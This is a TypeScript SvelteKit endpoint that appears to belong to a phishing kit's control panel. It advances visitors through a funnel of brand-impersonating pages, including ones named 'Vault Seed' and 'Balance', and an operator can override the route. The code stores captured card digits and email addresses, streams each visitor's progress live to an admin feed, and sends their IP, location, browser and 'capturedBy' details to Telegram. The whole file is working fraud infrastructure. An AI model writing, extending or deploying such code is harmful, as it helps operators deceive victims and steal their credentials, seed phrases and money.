/**
 * Visitor page advance.
 *
 * Every interactive visitor template (Activity, Balance, External, Vault Seed, …)
 * POSTs here when the visitor presses its primary CTA. We log the action to the
 * admin activity feed and respond with the URL the visitor should move to next,
 * resolved through `getNextUrl` (admin override > default funnel mapping).
 *
 * Public endpoint — visitor pages must reach it without auth.
 */
import { json, type RequestHandler } from '@sveltejs/kit';
import { serverState } from '$lib/server/state';
import { broadcast } from '$lib/server/websocket';
import { getNextUrl, getNextLabel, labelToUrl, labelToVisitorUrl } from '$lib/server/funnel';
import { notifyPageAction } from '$lib/server/telegram';
import { dbSetVisitorFlowSteps } from '$lib/server/database';

const PANEL_HOST = (process.env.PANEL_HOST || '').toLowerCase();

export const POST: RequestHandler = async ({ request, getClientAddress, url }) => {
	let body: { brand?: string; page?: string; choice?: string; detail?: string } = {};
	try {
		body = await request.json();
	} catch {
		return json({ ok: false, error: 'invalid json' }, { status: 400 });
	}

	const brand = String(body.brand ?? '').trim();
	const page = String(body.page ?? '').trim();
	const choice = String(body.choice ?? '').trim().slice(0, 160);
	const detail = String(body.detail ?? '').trim().slice(0, 200);

	if (!brand || !page) {
		return json({ ok: false, error: 'brand and page required' }, { status: 400 });
	}

	const ip = getClientAddress() || '';

	const visitor = serverState.visitors.get(ip);
	if (!visitor) {
		return json({ ok: false, error: 'no_session' }, { status: 400 });
	}

	const qp = new URLSearchParams();
	if (visitor?.lastTwoDigits) qp.set('last2', visitor.lastTwoDigits);
	if (visitor?.emailFrom) qp.set('emailFrom', visitor.emailFrom);
	if (visitor?.emailTo) qp.set('emailTo', visitor.emailTo);

	const hostname = url.hostname.toLowerCase();
	const isVisitorHost = !!(PANEL_HOST && hostname !== PANEL_HOST);

	// 1. Honor assigned flow first — mark current step passed, advance to next unpassed
	let nextUrl: string | null = null;
	let nextLabel: string | null = null;
	const currentLabel = `${brand}/${page}`;

	if (!visitor.flowBypassed && visitor.flowSteps?.length > 0) {
		const stepIdx = visitor.flowSteps.findIndex((s) => s.page === currentLabel && !s.passed);
		if (stepIdx !== -1) {
			visitor.flowSteps[stepIdx].passed = true;
			try { dbSetVisitorFlowSteps(ip, visitor.flowSteps); } catch { /* non-critical */ }
			const nextStep = visitor.flowSteps.find((s) => !s.passed);
			if (nextStep && /^[A-Z][^/]+\/.+/.test(nextStep.page)) {
				nextLabel = nextStep.page;
				nextUrl = isVisitorHost
					? labelToVisitorUrl(nextLabel, visitor.module, qp.size ? qp : undefined)
					: (() => {
						const base = labelToUrl(nextLabel);
						if (!base) return null;
						const qs = qp.toString();
						return qs ? `${base}?${qs}` : base;
					})();
			}
		}
	}

	// 2. Fallback to the default funnel mapping
	if (!nextUrl) {
		nextUrl = getNextUrl(brand, page, qp.size ? qp : undefined, {
			module: visitor.module,
			isVisitorHost
		});
		nextLabel = getNextLabel(brand, page);
	}

	if (nextLabel && visitor) {
		serverState.setVisitorLastPage(ip, nextLabel);
		broadcast({ type: 'visitor:updated', payload: visitor });
	}

	if (ip && nextUrl) {
		const match = nextUrl.match(/\/templates\/preview\/([^/]+)\/([^?]+)/);
		if (match) {
			const nextTemplate = `${decodeURIComponent(match[1])}/${decodeURIComponent(match[2])}`;
			const visitor = serverState.setVisitorLastPage(ip, nextTemplate);
			if (visitor) {
				try {
					broadcast({ type: 'visitor:updated', payload: visitor });
				} catch {
					/* ws may not be ready */
				}
			}
		}
	}

	const parts = [`visitor ${ip} advanced from ${brand}/${page}`];
	if (choice) parts.push(`— ${choice}`);
	if (detail) parts.push(`(${detail})`);
	const message = parts.join(' ');

	const entry = serverState.addLogEntry(message, 'action');
	try {
		broadcast({ type: 'log:new', payload: entry });
	} catch {
		/* ws may not be ready in dev */
	}

	if (visitor) {
		notifyPageAction(
			{
				ip,
				userId: visitor.userId,
				city: visitor.city,
				region: visitor.region,
				country: visitor.country,
				browser: visitor.browser,
				platform: visitor.platform,
				module: visitor.module,
				capturedBy: visitor.capturedBy,
				lastPageRoute: `${brand}/${page}`
			},
			`${brand}/${page}`,
			choice || 'Continue',
			detail || undefined
		).catch(() => {});
	}

	return json({ ok: true, nextUrl });
};
